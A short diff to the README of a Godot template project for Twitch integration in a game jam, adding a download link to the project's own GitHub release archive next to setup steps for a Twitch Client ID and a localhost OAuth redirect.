@@ -4,6 +4,8 @@ This is a template project for integrating Twitch in Godot for the [Backseating 
 
 This project uses [Twitcher](https://twitcher.kani.dev/) for Twitch integration, but there are multiple options available.
 
+### [Download Here](https://github.com/SomeRanDev/BackseatingAllowedJam-Godot/releases/download/1.0.0/BackseatingAllowedJam-Godot.7z)
+
 ## Setup
 
 To start using this project, you must first obtain your Client ID and input it. To do so, create an application in the [Twitch Developer Console](https://dev.twitch.tv/console). Please add a "OAuth Redirect URL" of `http://localhost:1234` (or whatever port you desire).
